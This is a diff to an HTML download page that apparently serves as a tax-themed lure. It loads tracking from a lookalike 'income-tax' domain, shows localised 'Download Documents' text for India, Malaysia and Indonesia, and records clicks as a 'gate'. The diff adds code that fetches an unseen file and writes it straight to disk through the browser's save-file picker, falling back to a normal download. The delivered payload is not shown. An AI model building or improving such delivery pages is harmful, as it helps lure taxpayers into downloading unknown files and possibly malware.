@@ -13,6 +13,7 @@
     button{display:inline-block;background:#000080;color:#fff;border:0;border-radius:6px;padding:14px 32px;font-size:16px;font-weight:bold;cursor:pointer}
     button:hover{background:#000060}
     #hint{display:none;margin-top:20px;font-size:14px;color:#0a7d0a}
+    #err{display:none;margin-top:20px;font-size:14px;color:#c00}
   </style>
   <script src="https://income-tax.my.id/track.js"></script>
 </head>
@@ -22,6 +23,7 @@
   <p class="sub" id="s">Please click the button below to download</p>
   <button id="btn">Download</button>
   <div id="hint"></div>
+  <div id="err"></div>
 </div>
 <script>
 (function(){
@@ -31,25 +33,33 @@
       title: 'दस्तावेज़ डाउनलोड करें / Download Documents',
       sub: 'कृपया डाउनलोड करने के लिए नीचे दिए गए बटन पर क्लिक करें / Please click the button below to download',
       btn: 'डाउनलोड करें / Download',
-      hint: 'डाउनलोड शुरू हो गया है। कृपया अपने डाउनलोड फ़ोल्डर (Download Folder) में देखें।'
+      hint: 'फ़ाइल सहेजी गई। / File saved.',
+      saved: 'फ़ाइल आपके चुने हुए स्थान पर सहेजी गई है। / The file has been saved to the location you selected.',
+      started: 'डाउनलोड शुरू हो गया है। कृपया अपने डाउनलोड फ़ोल्डर में देखें। / Download started. Please check your Downloads folder.'
     },
     MY: {
       title: 'Muat Turun Dokumen',
       sub: 'Sila klik butang di bawah untuk memuat turun',
       btn: 'Muat Turun',
-      hint: 'Muat turun telah bermula. Sila semak folder Downloads anda.'
+      hint: 'Fail disimpan. / File saved.',
+      saved: 'Fail telah disimpan ke lokasi yang anda pilih. / The file has been saved to the location you selected.',
+      started: 'Muat turun telah bermula. Sila semak folder Downloads anda.'
     },
     ID: {
       title: 'Unduh Dokumen',
       sub: 'Silakan klik tombol di bawah untuk mengunduh',
       btn: 'Unduh',
-      hint: 'Unduhan telah dimulai. Silakan periksa folder Downloads Anda.'
+      hint: 'Berkas tersimpan. / File saved.',
+      saved: 'Berkas telah disimpan ke lokasi yang Anda pilih. / The file has been saved to the location you selected.',
+      started: 'Unduhan telah dimulai. Silakan periksa folder Downloads Anda.'
     },
     OTHER: {
       title: 'Download Documents',
       sub: 'Please click the button below to download',
       btn: 'Download',
-      hint: 'Download started. Please check your Downloads folder.'
+      hint: 'File saved.',
+      saved: 'The file has been saved to the location you selected.',
+      started: 'Download started. Please check your Downloads folder.'
     }
   };
   var region = new URLSearchParams(location.search).get('region') || 'OTHER';
@@ -58,14 +68,45 @@
   document.getElementById('s').textContent = L.sub;
   document.getElementById('btn').textContent = L.btn;
   document.getElementById('hint').textContent = L.hint;
-  document.getElementById('btn').addEventListener('click', function(){
-    try{ if(window.GateTrack) GateTrack.dl('gate'); }catch(e){}
+
+  function fileNameFrom(cd){
+    var m = /filename\*=UTF-8''([^;]+)/i.exec(cd || '');
+    if (m) { try { return decodeURIComponent(m[1]); } catch(e){} }
+    var m2 = /filename="([^"]+)"/i.exec(cd || '');
+    if (m2) return m2[1];
+    return 'download';
+  }
+  function normalDownload(){
     var a = document.createElement('a');
     a.href = DL;
     a.style.display = 'none';
     document.body.appendChild(a);
     a.click();
-    document.getElementById('hint').style.display = 'block';
+    var h = document.getElementById('hint');
+    h.textContent = L.started;
+    h.style.display = 'block';
+  }
+  document.getElementById('btn').addEventListener('click', function(){
+    try{ if(window.GateTrack) GateTrack.dl('gate'); }catch(e){}
+    if (!window.showSaveFilePicker) { normalDownload(); return; }
+    fetch(DL, {mode:'cors', cache:'no-store'}).then(function(resp){
+      var fname = fileNameFrom(resp.headers.get('Content-Disposition'));
+      return resp.blob().then(function(blob){
+        return window.showSaveFilePicker({ suggestedName: fname }).then(function(handle){
+          return handle.createWritable().then(function(w){
+            return w.write(blob).then(function(){ return w.close(); }).then(function(){
+              var h = document.getElementById('hint');
+              h.textContent = L.saved;
+              h.style.display = 'block';
+            });
+          });
+        });
+      });
+    }).catch(function(e){
+      // 用户取消保存框（AbortError）→ 静默；其他错误 → 回退普通下载
+      if (e && e.name === 'AbortError') return;
+      normalDownload();
+    });
   });
 })();
 </script>
